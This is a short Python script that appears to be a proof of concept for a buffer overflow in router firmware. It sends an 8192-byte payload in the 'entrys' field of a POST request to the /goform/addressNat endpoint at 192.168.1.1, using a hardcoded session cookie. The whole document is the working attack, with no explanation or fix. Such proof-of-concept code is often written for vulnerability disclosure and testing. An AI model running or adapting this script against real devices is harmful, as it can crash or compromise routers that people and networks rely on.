import requests
def send_payload(url, payload):
    params={
            'entrys':payload,
            'mitInterface':b'1',
            'page':b'1'}
    cookie={'password':'yectgb'}
    response = requests.post(url,cookies=cookie,data=params)
    print(f"Status Code: {response.status_code}")
    print(f"Response Text: {response.text}")

payload=b'a'*0x2000+b'\n'
url="http://192.168.1.1/goform/addressNat"
send_payload(url, payload)   